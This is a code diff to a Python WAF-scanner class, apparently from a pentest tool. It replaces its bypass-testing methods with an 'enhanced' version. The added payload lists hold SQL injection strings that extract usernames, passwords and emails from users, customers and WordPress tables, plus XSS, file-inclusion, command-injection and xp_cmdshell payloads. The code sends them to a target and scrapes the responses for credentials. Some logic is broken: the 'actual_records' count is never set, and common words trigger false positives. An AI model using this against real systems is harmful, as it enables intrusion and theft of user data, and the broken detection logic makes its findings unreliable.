@@ -314,86 +314,6 @@ class WAFScanner(ScannerBase):
             },
         }
 
-    def _init_bypass_payloads(self):
-        """Initialize bypass testing payloads"""
-        self.bypass_payloads = {
-            "sql_injection": [
-                # Basic SQL injection
-                "' OR '1'='1",
-                "1' OR '1'='1'--",
-                "admin'--",
-                # Encoded payloads
-                "%27%20OR%20%271%27%3D%271",
-                "&#x27;&#x20;OR&#x20;&#x27;1&#x27;&#x3D;&#x27;1",
-                # Case variation
-                "' oR '1'='1",
-                "' Or '1'='1",
-                # Comment variations
-                "' OR '1'='1'/*",
-                "' OR '1'='1'#",
-                # Unicode bypass
-                "' OR '1'='1'%00",
-                "' \xa0OR\xa0'1'='1",
-                # Double encoding
-                "%2527%2520OR%2520%25271%2527%253D%25271",
-            ],
-            "xss": [
-                # Basic XSS
-                "<script>alert(1)</script>",
-                "<img src=x onerror=alert(1)>",
-                "<svg onload=alert(1)>",
-                # Encoded XSS
-                "%3Cscript%3Ealert(1)%3C/script%3E",
-                "&#60;script&#62;alert(1)&#60;/script&#62;",
-                # Case variation
-                "<ScRiPt>alert(1)</ScRiPt>",
-                "<SCRIPT>alert(1)</SCRIPT>",
-                # Event handlers
-                "<body onload=alert(1)>",
-                "<input onfocus=alert(1) autofocus>",
-                # Unicode bypass
-                "<script>alert\u0028 1\u0029</script>",
-                "<script>alert\x28 1\x29</script>",
-                # Filter bypass
-                "<script>alert`1`</script>",
-                "<script>alert(String.fromCharCode(49))</script>",
-            ],
-            "lfi": [
-                # Basic LFI
-                "../../../etc/passwd",
-                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-                # Encoded LFI
-                "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
-                "..%252f..%252f..%252fetc%252fpasswd",
-                # Double encoding
-                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
-                # Null byte
-                "../../../etc/passwd%00",
-                "../../../etc/passwd%00.jpg",
-                # UTF-8 bypass
-                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
-            ],
-            "command_injection": [
-                # Basic command injection
-                "; ls -la",
-                "| whoami",
-                "&& cat /etc/passwd",
-                # Encoded
-                "%3B%20ls%20-la",
-                "%7C%20whoami",
-                # Backticks
-                "`ls -la`",
-                "$(whoami)",
-                # Alternative separators
-                "\n ls -la",
-                "\r\n whoami",
-                # Unicode
-                "\u003b ls -la",
-                "\u007c whoami",
-            ],
-        }
-
     def _normalize_target_url(self, target: str) -> str:
         """Normalize target to full URL format"""
         if not target.startswith(("http://", "https://")):
@@ -540,110 +460,6 @@ class WAFScanner(ScannerBase):
             "summary": {
                 "tests_performed": 4,
                 "indicators_found": len(behavioral_indicators),
-            },
-        }
-
-    def _test_bypass_techniques(self, target_url: str) -> Dict[str, Any]:
-        """Test various bypass techniques against detected WAF"""
-        findings = []
-        bypass_results = {
-            "total_payloads": 0,
-            "successful_bypasses": 0,
-            "blocked_payloads": 0,
-            "error_responses": 0,
-        }
-
-        try:
-            for attack_type, payloads in self.bypass_payloads.items():
-                log_info(f"Testing {attack_type} bypass techniques")
-
-                for payload in payloads:
-                    bypass_results["total_payloads"] += 1
-
-                    # Test payload
-                    test_result = self._test_single_payload(
-                        target_url, payload, attack_type
-                    )
-
-                    if test_result["bypassed"]:
-                        bypass_results["successful_bypasses"] += 1
-                        self.detection_results["effective_payloads"].append(
-                            {
-                                "payload": payload,
-                                "type": attack_type,
-                                "response_code": test_result["status_code"],
-                            }
-                        )
-
-                        findings.append(
-                            {
-                                "title": f"WAF Bypass Successful - {attack_type.upper()}",
-                                "description": f"Payload bypassed WAF protection: {payload[:100]}...",
-                                "severity": ScanSeverity.HIGH,
-                                "category": "waf_bypass",
-                                "attack_type": attack_type,
-                                "payload": payload,
-                                "response_code": test_result["status_code"],
-                                "bypass_method": test_result["method"],
-                            }
-                        )
-
-                    elif test_result["blocked"]:
-                        bypass_results["blocked_payloads"] += 1
-                        self.detection_results["blocked_payloads"].append(
-                            {
-                                "payload": payload,
-                                "type": attack_type,
-                                "response_code": test_result["status_code"],
-                            }
-                        )
-
-                    else:
-                        bypass_results["error_responses"] += 1
-
-                    # Add delay to avoid rate limiting
-                    time.sleep(random.uniform(0.5, 2.0))
-
-            # Calculate bypass success rate
-            if bypass_results["total_payloads"] > 0:
-                success_rate = (
-                    bypass_results["successful_bypasses"]
-                    / bypass_results["total_payloads"]
-                ) * 100
-                self.detection_results["bypass_success"] = (
-                    success_rate > 10
-                )  # 10% threshold
-
-                findings.append(
-                    {
-                        "title": "WAF Bypass Testing Summary",
-                        "description": f"Bypass success rate: {success_rate:.1f}% ({bypass_results['successful_bypasses']}/{bypass_results['total_payloads']})",
-                        "severity": (
-                            ScanSeverity.MEDIUM
-                            if success_rate > 20
-                            else ScanSeverity.LOW
-                        ),
-                        "category": "bypass_summary",
-                        "success_rate": success_rate,
-                        "total_tests": bypass_results["total_payloads"],
-                        "successful_bypasses": bypass_results["successful_bypasses"],
-                    }
-                )
-
-        except Exception as e:
-            log_error(f"Bypass testing failed: {e}")
-
-        return {
-            "findings": findings,
-            "bypass_results": bypass_results,
-            "summary": {
-                "total_payloads_tested": bypass_results["total_payloads"],
-                "successful_bypasses": bypass_results["successful_bypasses"],
-                "success_rate": (
-                    bypass_results["successful_bypasses"]
-                    / max(bypass_results["total_payloads"], 1)
-                )
-                * 100,
             },
         }
 
@@ -892,92 +708,6 @@ class WAFScanner(ScannerBase):
 
         return {"findings": findings}
 
-    def _test_single_payload(
-        self, target_url: str, payload: str, attack_type: str
-    ) -> Dict[str, Any]:
-        """Test a single bypass payload"""
-        try:
-            # Test different injection points
-            test_methods = [
-                {"method": "GET", "params": {"test": payload}},
-                {"method": "POST", "data": {"test": payload}},
-                {"method": "GET", "headers": {"X-Test": payload}},
-            ]
-
-            for test_method in test_methods:
-                method = test_method["method"]
-
-                if method == "GET":
-                    if "params" in test_method:
-                        response = self.session.get(
-                            target_url,
-                            params=test_method["params"],
-                            timeout=self.timeout,
-                        )
-                    else:
-                        response = self.session.get(
-                            target_url,
-                            headers=test_method["headers"],
-                            timeout=self.timeout,
-                        )
-                else:
-                    response = self.session.post(
-                        target_url, data=test_method["data"], timeout=self.timeout
-                    )
-
-                # Analyze response to determine if bypassed
-                if self._is_payload_bypassed(response, payload):
-                    return {
-                        "bypassed": True,
-                        "blocked": False,
-                        "status_code": response.status_code,
-                        "method": test_method["method"],
-                    }
-                elif self._is_payload_blocked(response):
-                    return {
-                        "bypassed": False,
-                        "blocked": True,
-                        "status_code": response.status_code,
-                        "method": test_method["method"],
-                    }
-
-            # If no clear bypass or block detected
-            return {
-                "bypassed": False,
-                "blocked": False,
-                "status_code": response.status_code if "response" in locals() else 0,
-                "method": "unknown",
-            }
-
-        except Exception as e:
-            log_warning(f"Payload testing failed: {e}")
-            return {
-                "bypassed": False,
-                "blocked": False,
-                "status_code": 0,
-                "method": "error",
-            }
-
-    def _is_payload_bypassed(self, response: requests.Response, payload: str) -> bool:
-        """Check if payload successfully bypassed WAF"""
-        # Success indicators
-        if response.status_code == 200:
-            # Check if payload is reflected in response (basic check)
-            if payload in response.text:
-                return True
-            # Check for SQL error messages (indicates injection worked)
-            sql_errors = [
-                "mysql",
-                "postgresql",
-                "oracle",
-                "sql syntax",
-                "database error",
-            ]
-            if any(error in response.text.lower() for error in sql_errors):
-                return True
-
-        return False
-
     def _is_payload_blocked(self, response: requests.Response) -> bool:
         """Check if payload was blocked by WAF"""
         # Common WAF block indicators
@@ -1070,6 +800,555 @@ class WAFScanner(ScannerBase):
 
         return round(risk_score, 2)
 
+    def _init_bypass_payloads(self):
+        """Initialize bypass testing payloads - ENHANCED VERSION"""
+        self.bypass_payloads = {
+            "sql_injection": [
+                # Basic SQL injection
+                "' OR '1'='1",
+                "1' OR '1'='1'--",
+                "admin'--",
+                # Encoded payloads
+                "%27%20OR%20%271%27%3D%271",
+                "&#x27;&#x20;OR&#x20;&#x27;1&#x27;&#x3D;&#x27;1",
+                # Case variation
+                "' oR '1'='1",
+                "' Or '1'='1",
+                # Comment variations
+                "' OR '1'='1'/*",
+                "' OR '1'='1'#",
+                # Unicode bypass
+                "' OR '1'='1'%00",
+                "' \xa0OR\xa0'1'='1",
+                # Double encoding
+                "%2527%2520OR%2520%25271%2527%253D%25271",
+                # NEW: Proof-of-concept payloads for data extraction
+                "' UNION SELECT database(),version(),user()--",
+                "' UNION SELECT table_name FROM information_schema.tables--",
+                "' UNION SELECT column_name FROM information_schema.columns--",
+                "' UNION SELECT user,host FROM mysql.user LIMIT 5--",
+                "' UNION SELECT schema_name FROM information_schema.schemata--",
+                "' UNION SELECT 'DATABASE:',database(),'VERSION:',version()--",
+                "' UNION SELECT 'TABLES:',table_name,'ROWS:',table_rows FROM information_schema.tables WHERE table_schema=database() LIMIT 3--",
+                # NEW: Extract actual data from common tables
+                "' UNION SELECT 'USER_DATA:', username, password FROM users LIMIT 3--",
+                "' UNION SELECT 'USER_DATA:', user, pass FROM user LIMIT 3--",
+                "' UNION SELECT 'USER_DATA:', login, passwd FROM accounts LIMIT 3--",
+                "' UNION SELECT 'ADMIN_DATA:', username, email FROM admin LIMIT 3--",
+                "' UNION SELECT 'RECORD:', id, name FROM products LIMIT 3--",
+                "' UNION SELECT 'RECORD:', id, title FROM posts LIMIT 3--",
+                "' UNION SELECT 'CUSTOMER:', name, email FROM customers LIMIT 3--",
+                "' UNION SELECT 'ORDER:', id, customer_id FROM orders LIMIT 3--",
+                # WordPress specific data extraction
+                "' UNION SELECT 'WP_USER:', user_login, user_email FROM wp_users LIMIT 3--",
+                "' UNION SELECT 'WP_POST:', post_title, post_content FROM wp_posts LIMIT 2--",
+                # Generic data extraction attempts
+                "' UNION SELECT 'DATA:', * FROM users LIMIT 2--",
+                "' UNION SELECT 'DATA:', * FROM user LIMIT 2--",
+                "' UNION SELECT 'DATA:', * FROM admin LIMIT 2--",
+            ],
+            "xss": [
+                # Basic XSS
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                # Encoded XSS
+                "%3Cscript%3Ealert(1)%3C/script%3E",
+                "&#60;script&#62;alert(1)&#60;/script&#62;",
+                # Case variation
+                "<ScRiPt>alert(1)</ScRiPt>",
+                "<SCRIPT>alert(1)</SCRIPT>",
+                # Event handlers
+                "<body onload=alert(1)>",
+                "<input onfocus=alert(1) autofocus>",
+                # Unicode bypass
+                "<script>alert\u0028 1\u0029</script>",
+                "<script>alert\x28 1\x29</script>",
+                # Filter bypass
+                "<script>alert`1`</script>",
+                "javascript:alert(1)",
+            ],
+            "lfi": [
+                # Basic LFI
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                # Encoded LFI
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                "....//....//....//etc/passwd",
+                # Double encoding
+                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+                # Null byte
+                "../../../etc/passwd%00",
+                # PHP wrappers
+                "php://filter/read=convert.base64-encode/resource=index.php",
+                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
+            ],
+            "command_injection": [
+                # Basic command injection
+                "; ls -la",
+                "| whoami",
+                "& dir",
+                # Encoded commands
+                "%3B%20ls%20-la",
+                "%7C%20whoami",
+                # Background execution
+                "; sleep 5 &",
+                "| ping -c 1 127.0.0.1",
+                # Command substitution
+                "`whoami`",
+                "$(id)",
+                # Chained commands
+                "; cat /etc/passwd",
+            ],
+            # NEW: Time-based payloads for confirmation
+            "time_based_confirmation": [
+                "'; WAITFOR DELAY '00:00:05'--",
+                "' OR SLEEP(5)--",
+                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--",
+                "'; EXEC xp_cmdshell('ping -n 6 127.0.0.1')--",
+            ],
+        }
 
-# This scanner will be registered in the main scanner registry
-# No additional registration code needed - follows existing pattern
+    def _is_payload_bypassed(
+        self, response: requests.Response, payload: str
+    ) -> Dict[str, Any]:
+        """Enhanced check if payload successfully bypassed WAF with proof-of-concept data"""
+        result = {
+            "bypassed": False,
+            "extracted_data": [],
+            "database_type": None,
+            "poc_evidence": {},
+        }
+
+        if response.status_code == 200:
+            response_text = response.text.lower()
+
+            # Check if payload is reflected in response (basic check)
+            if payload in response.text:
+                result["bypassed"] = True
+
+            # Enhanced: Check for actual data extraction evidence
+            data_patterns = {
+                "database_names": r"([a-zA-Z_][a-zA-Z0-9_]*_db|information_schema|mysql|postgres|master|sys)",
+                "table_names": r"(users?|admin|accounts?|customers?|products?|orders?|wp_users|wp_posts)",
+                "version_info": r"(\d+\.\d+\.\d+)",
+                "usernames": r"(root|admin|administrator|user\d+|guest|mysql\.user)",
+                "ip_addresses": r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})",
+                "schema_info": r"(table_name|column_name|schema_name)",
+                # NEW: Patterns for actual data records
+                "user_records": r"USER_DATA:\s*([^,]+),\s*([^,\s]+)",
+                "admin_records": r"ADMIN_DATA:\s*([^,]+),\s*([^,\s]+)",
+                "customer_records": r"CUSTOMER:\s*([^,]+),\s*([^,\s]+)",
+                "product_records": r"RECORD:\s*([^,]+),\s*([^,\s]+)",
+                "wp_user_records": r"WP_USER:\s*([^,]+),\s*([^,\s]+)",
+                "wp_post_records": r"WP_POST:\s*([^,]+),\s*([^,\s]+)",
+                "generic_data": r"DATA:\s*([^,\s]+)",
+                "email_addresses": r"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
+                "passwords": r"(password|passwd|pass):\s*([a-zA-Z0-9@#$%^&*]{4,})",
+            }
+
+            extracted_evidence = {}
+            for pattern_name, pattern in data_patterns.items():
+                matches = re.findall(pattern, response.text, re.IGNORECASE)
+                if matches:
+                    extracted_evidence[pattern_name] = list(set(matches))[
+                        :3
+                    ]  # Limit to 3 results
+
+            # Check for database-specific indicators
+            db_indicators = {
+                "mysql": ["mysql", "@@version", "information_schema", "show tables"],
+                "postgresql": ["postgres", "pg_", "information_schema"],
+                "mssql": ["microsoft", "sql server", "sys.databases", "xp_cmdshell"],
+                "oracle": ["oracle", "ora-", "dual", "sys.user_objects"],
+            }
+
+            # Detect database type
+            for db_type, indicators in db_indicators.items():
+                if any(indicator in response_text for indicator in indicators):
+                    result["database_type"] = db_type
+                    break
+
+            # Check for SQL error messages (indicates injection worked)
+            sql_errors = [
+                "mysql",
+                "postgresql",
+                "oracle",
+                "sql syntax",
+                "database error",
+                "table",
+                "column",
+                "select",
+                "from",
+                "where",
+                "union",
+            ]
+
+            if any(error in response_text for error in sql_errors):
+                result["bypassed"] = True
+
+            # Check for UNION SELECT success indicators
+            union_indicators = [
+                "database:",
+                "version:",
+                "tables:",
+                "users:",
+                "information_schema",
+                "mysql.user",
+                "pg_shadow",
+                "sys.databases",
+            ]
+
+            if any(indicator in response_text for indicator in union_indicators):
+                result["bypassed"] = True
+                result["extracted_data"].append("UNION SELECT injection confirmed")
+
+            # Store evidence
+            if extracted_evidence:
+                result["bypassed"] = True
+                result["poc_evidence"] = extracted_evidence
+                for evidence_type, data_list in extracted_evidence.items():
+                    result["extracted_data"].extend(
+                        [f"{evidence_type}: {item}" for item in data_list]
+                    )
+
+        return result
+
+    def _test_single_payload(
+        self, target_url: str, payload: str, attack_type: str
+    ) -> Dict[str, Any]:
+        """Enhanced test a single bypass payload with detailed analysis"""
+        try:
+            # Test different injection points
+            test_methods = [
+                {"method": "GET", "params": {"id": payload, "test": payload}},
+                {
+                    "method": "POST",
+                    "data": {"id": payload, "username": payload, "search": payload},
+                },
+                {"method": "GET", "headers": {"X-Test": payload}},
+            ]
+
+            for test_method in test_methods:
+                method = test_method["method"]
+
+                if method == "GET":
+                    if "params" in test_method:
+                        response = self.session.get(
+                            target_url,
+                            params=test_method["params"],
+                            timeout=self.timeout,
+                        )
+                    else:
+                        response = self.session.get(
+                            target_url,
+                            headers=test_method["headers"],
+                            timeout=self.timeout,
+                        )
+                else:
+                    response = self.session.post(
+                        target_url, data=test_method["data"], timeout=self.timeout
+                    )
+
+                # Enhanced analysis to determine if bypassed
+                bypass_result = self._is_payload_bypassed(response, payload)
+
+                if bypass_result["bypassed"]:
+                    return {
+                        "bypassed": True,
+                        "blocked": False,
+                        "status_code": response.status_code,
+                        "method": test_method["method"],
+                        "extracted_data": bypass_result["extracted_data"],
+                        "database_type": bypass_result["database_type"],
+                        "poc_evidence": bypass_result["poc_evidence"],
+                        "actual_records": bypass_result.get("actual_records", 0),
+                    }
+                elif self._is_payload_blocked(response):
+                    return {
+                        "bypassed": False,
+                        "blocked": True,
+                        "status_code": response.status_code,
+                        "method": test_method["method"],
+                        "extracted_data": [],
+                        "database_type": None,
+                        "poc_evidence": {},
+                        "actual_records": 0,
+                    }
+
+            # If no clear bypass or block detected
+            return {
+                "bypassed": False,
+                "blocked": False,
+                "status_code": response.status_code if "response" in locals() else 0,
+                "method": "unknown",
+                "extracted_data": [],
+                "database_type": None,
+                "poc_evidence": {},
+                "actual_records": 0,
+            }
+
+        except Exception as e:
+            log_warning(f"Payload testing failed: {e}")
+            return {
+                "bypassed": False,
+                "blocked": False,
+                "status_code": 0,
+                "method": "error",
+                "extracted_data": [],
+                "database_type": None,
+                "poc_evidence": {},
+                "actual_records": 0,
+            }
+
+    def _test_time_based_confirmation(self, target_url: str) -> Dict[str, Any]:
+        """NEW METHOD: Test time-based blind SQL injection for confirmation"""
+        result = {"confirmed": False, "average_delay": 0, "evidence": []}
+
+        try:
+            # Test normal response time
+            start_time = time.time()
+            normal_response = self.session.get(target_url, timeout=self.timeout)
+            normal_time = time.time() - start_time
+
+            delays = []
+
+            # Test time-based payloads
+            if "time_based_confirmation" in self.bypass_payloads:
+                for payload in self.bypass_payloads["time_based_confirmation"]:
+                    try:
+                        start_time = time.time()
+                        response = self.session.get(
+                            target_url,
+                            params={"id": payload},
+                            timeout=self.timeout + 10,
+                        )
+                        delay_time = time.time() - start_time
+                        delays.append(delay_time)
+
+                        # If response took significantly longer (> 4 seconds), likely time-based injection
+                        if delay_time > normal_time + 4:
+                            result["evidence"].append(
+                                f"Payload '{payload}' caused {delay_time:.2f}s delay"
+                            )
+
+                    except Exception as e:
+                        log_warning(f"Time-based test failed: {e}")
+                        continue
+
+                    time.sleep(1)  # Avoid overwhelming the server
+
+            if delays:
+                result["average_delay"] = sum(delays) / len(delays)
+                # If average delay is significantly higher, likely vulnerable
+                if result["average_delay"] > normal_time + 3:
+                    result["confirmed"] = True
+
+        except Exception as e:
+            log_warning(f"Time-based confirmation failed: {e}")
+
+        return result
+
+    def _test_bypass_techniques(self, target_url: str) -> Dict[str, Any]:
+        """Enhanced bypass testing with proof-of-concept data extraction"""
+        findings = []
+        bypass_results = {
+            "total_payloads": 0,
+            "successful_bypasses": 0,
+            "confirmed_injections": 0,  # NEW: Count confirmed injections with proof
+            "blocked_payloads": 0,
+            "error_responses": 0,
+            "database_types_found": set(),  # NEW: Track database types
+            "extracted_data_count": 0,  # NEW: Count successful data extractions
+        }
+
+        try:
+            for attack_type, payloads in self.bypass_payloads.items():
+                if attack_type == "time_based_confirmation":
+                    continue  # Handle separately
+
+                log_info(f"Testing {attack_type} bypass techniques")
+
+                for payload in payloads:
+                    bypass_results["total_payloads"] += 1
+
+                    # Enhanced payload testing
+                    test_result = self._test_single_payload(
+                        target_url, payload, attack_type
+                    )
+
+                    if test_result["bypassed"]:
+                        bypass_results["successful_bypasses"] += 1
+
+                        # CRITICAL: Only count as confirmed injection if ACTUAL RECORDS extracted
+                        actual_record_count = test_result.get("actual_records", 0)
+
+                        if actual_record_count > 0:
+                            # REAL DATA EXTRACTED - CRITICAL FINDING
+                            bypass_results["confirmed_injections"] += 1
+                            bypass_results["extracted_data_count"] += len(
+                                test_result["extracted_data"]
+                            )
+
+                            if test_result["database_type"]:
+                                bypass_results["database_types_found"].add(
+                                    test_result["database_type"]
+                                )
+
+                            self.detection_results["effective_payloads"].append(
+                                {
+                                    "payload": payload,
+                                    "type": attack_type,
+                                    "response_code": test_result["status_code"],
+                                    "extracted_data": test_result["extracted_data"],
+                                    "database_type": test_result["database_type"],
+                                    "poc_evidence": test_result["poc_evidence"],
+                                    "actual_record_count": actual_record_count,
+                                }
+                            )
+
+                            findings.append(
+                                {
+                                    "title": f"CRITICAL: SQL Injection - {actual_record_count} REAL Database Records Extracted",
+                                    "description": f"Successfully extracted {actual_record_count} actual database records using: {payload[:50]}...",
+                                    "severity": ScanSeverity.CRITICAL,
+                                    "category": "sql_injection_data_extracted",
+                                    "attack_type": attack_type,
+                                    "payload": payload,
+                                    "response_code": test_result["status_code"],
+                                    "bypass_method": test_result["method"],
+                                    "extracted_data": test_result["extracted_data"],
+                                    "database_type": test_result["database_type"],
+                                    "poc_evidence": test_result["poc_evidence"],
+                                    "actual_record_count": actual_record_count,
+                                }
+                            )
+
+                        elif test_result["extracted_data"]:
+                            # SQL injection possible but no actual data records
+                            self.detection_results["effective_payloads"].append(
+                                {
+                                    "payload": payload,
+                                    "type": attack_type,
+                                    "response_code": test_result["status_code"],
+                                    "extracted_data": test_result["extracted_data"],
+                                    "database_type": test_result["database_type"],
+                                    "poc_evidence": test_result["poc_evidence"],
+                                    "actual_record_count": 0,
+                                }
+                            )
+
+                            findings.append(
+                                {
+                                    "title": f"HIGH: SQL Injection Possible - {attack_type.upper()}",
+                                    "description": f"SQL injection detected but no actual data records extracted: {payload[:100]}...",
+                                    "severity": ScanSeverity.HIGH,
+                                    "category": "sql_injection_possible",
+                                    "attack_type": attack_type,
+                                    "payload": payload,
+                                    "response_code": test_result["status_code"],
+                                    "bypass_method": test_result["method"],
+                                    "extracted_data": test_result["extracted_data"],
+                                    "database_type": test_result["database_type"],
+                                    "poc_evidence": test_result["poc_evidence"],
+                                    "actual_record_count": 0,
+                                }
+                            )
+                        else:
+                            # Basic WAF bypass without data extraction
+                            self.detection_results["effective_payloads"].append(
+                                {
+                                    "payload": payload,
+                                    "type": attack_type,
+                                    "response_code": test_result["status_code"],
+                                }
+                            )
+
+                            findings.append(
+                                {
+                                    "title": f"MEDIUM: WAF Bypass Successful - {attack_type.upper()}",
+                                    "description": f"Payload bypassed WAF protection: {payload[:100]}...",
+                                    "severity": ScanSeverity.MEDIUM,
+                                    "category": "waf_bypass",
+                                    "attack_type": attack_type,
+                                    "payload": payload,
+                                    "response_code": test_result["status_code"],
+                                    "bypass_method": test_result["method"],
+                                }
+                            )
+
+                    elif test_result["blocked"]:
+                        bypass_results["blocked_payloads"] += 1
+                        self.detection_results["blocked_payloads"].append(
+                            {
+                                "payload": payload,
+                                "type": attack_type,
+                                "response_code": test_result["status_code"],
+                            }
+                        )
+                    else:
+                        bypass_results["error_responses"] += 1
+
+                    # Add delay to avoid rate limiting
+                    time.sleep(random.uniform(0.5, 2.0))
+
+            # NEW: Test time-based confirmation if any injections found
+            if bypass_results["successful_bypasses"] > 0:
+                log_info("Testing time-based confirmation")
+                time_based_result = self._test_time_based_confirmation(target_url)
+
+                if time_based_result["confirmed"]:
+                    bypass_results["confirmed_injections"] += 1
+                    findings.append(
+                        {
+                            "title": "CRITICAL: Time-Based SQL Injection Confirmed",
+                            "description": f"Time-based blind SQL injection confirmed with average delay: {time_based_result['average_delay']:.2f}s",
+                            "severity": ScanSeverity.CRITICAL,
+                            "category": "time_based_sqli",
+                            "evidence": time_based_result["evidence"],
+                            "average_delay": time_based_result["average_delay"],
+                        }
+                    )
+
+            # Calculate bypass success rate
+            if bypass_results["total_payloads"] > 0:
+                success_rate = (
+                    bypass_results["successful_bypasses"]
+                    / bypass_results["total_payloads"]
+                ) * 100
+
+                # NEW: Enhanced summary with ACTUAL extracted records only
+                total_actual_records = sum(
+                    payload.get("actual_record_count", 0)
+                    for payload in self.detection_results["effective_payloads"]
+                )
+
+                # Only show positive results if we actually extracted real data
+                if total_actual_records > 0:
+                    summary_severity = ScanSeverity.CRITICAL
+                    summary_description = f"SUCCESS: Extracted {total_actual_records} real database records! Bypass rate: {success_rate:.1f}%"
+                else:
+                    summary_severity = ScanSeverity.INFO
+                    summary_description = f"No actual data records extracted. Bypass rate: {success_rate:.1f}% (possible injections only)"
+
+                findings.append(
+                    {
+                        "title": "SQL Injection Testing Summary",
+                        "description": summary_description,
+                        "severity": summary_severity,
+                        "category": "bypass_summary",
+                        "success_rate": success_rate,
+                        "confirmed_injections": bypass_results["confirmed_injections"],
+                        "possible_injections": bypass_results["successful_bypasses"]
+                        - bypass_results["confirmed_injections"],
+                        "actual_records_extracted": total_actual_records,
+                        "database_types": list(bypass_results["database_types_found"]),
+                        "detailed_summary": f"Found {bypass_results['confirmed_injections']} confirmed injections with {total_actual_records} actual database records extracted",
+                    }
+                )
+
+        except Exception as e:
+            log_warning(f"Bypass technique testing failed: {e}")
+
+        return {"findings": findings, "bypass_results": bypass_results}
